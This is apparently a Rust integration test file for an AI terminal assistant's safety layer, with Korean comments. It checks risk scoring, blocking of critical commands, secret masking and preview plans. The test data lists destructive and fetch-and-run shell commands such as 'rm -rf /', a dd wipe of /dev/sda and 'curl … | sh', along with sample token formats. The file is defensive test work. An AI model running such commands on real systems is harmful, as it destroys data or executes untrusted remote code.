//! M1~M4 크로스모듈 통합/속성 테스트 (설계 §22, §31.12, W16).
//!
//! LLM 비결정성 회귀의 로컬 결정성 부분, 마스킹 무유출, Critical 차단 100%를
//! 전 구간에서 검증한다(실제 provider end-to-end는 Phase 2).

use ai_terminal::mask::Masker;
use ai_terminal::policy::{Decision, PolicyProfile};
use ai_terminal::preview::{classify_preview, PreviewPlan};
use ai_terminal::risk::{self, RiskLevel};

/// 위험도 점수는 deterministic — 동일 명령은 항상 동일 점수(§31.4 수용 기준).
#[test]
fn risk_scoring_is_deterministic_across_runs() {
    let cmds = [
        "ls -al",
        "rm -rf /",
        "sudo systemctl restart nginx",
        "chmod -R 777 .",
        "dd if=/dev/zero of=/dev/sda",
        "curl https://x.sh | sh",
    ];
    for cmd in cmds {
        let first = risk::assess(cmd).score;
        for _ in 0..50 {
            assert_eq!(risk::assess(cmd).score, first, "non-deterministic: {cmd}");
        }
    }
}

/// Critical 명령은 두 프로파일 모두에서 차단된다(KPI: Critical 차단 100%).
#[test]
fn critical_commands_blocked_in_all_profiles() {
    let critical = ["rm -rf /", "dd if=/dev/zero of=/dev/sda"];
    for cmd in critical {
        let level = risk::assess(cmd).level;
        assert_eq!(level, RiskLevel::Critical, "{cmd} should be Critical");
        for profile in [PolicyProfile::balanced(), PolicyProfile::paranoid()] {
            assert_eq!(
                profile.decide(level),
                Decision::Block,
                "{} must block {cmd}",
                profile.name
            );
        }
    }
}

/// 마스킹은 알려진 secret 원문을 출력에 남기지 않는다(KPI: 마스킹 누락 0).
#[test]
fn masking_never_leaks_known_secrets() {
    let m = Masker::baseline();
    let secrets = [
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "xoxb-1234567890-abcdefghij",
    ];
    for s in secrets {
        let input = format!("export TOKEN={s} && run");
        let out = m.mask(&input);
        assert!(!out.text.contains(s), "leaked secret: {s} in {}", out.text);
    }
    // private key block은 원격 전송 차단(fail-closed).
    let pk = m.mask("-----BEGIN OPENSSH PRIVATE KEY-----");
    assert!(pk.blocked, "private key must block remote");
}

/// 위험 등급과 preview 전략이 위험 명령에서 일관된다(파괴적 명령은 preview 가능).
#[test]
fn destructive_commands_have_preview_strategy() {
    assert!(matches!(
        classify_preview("rm -rf ./build"),
        PreviewPlan::ListTargets(_)
    ));
    assert_eq!(
        classify_preview("ls -al"),
        PreviewPlan::NotNeeded,
        "read-only는 preview 불필요"
    );
    // 위험 명령은 Low보다 높게 평가된다.
    assert!(risk::assess("rm -rf ./build").score > 24);
}
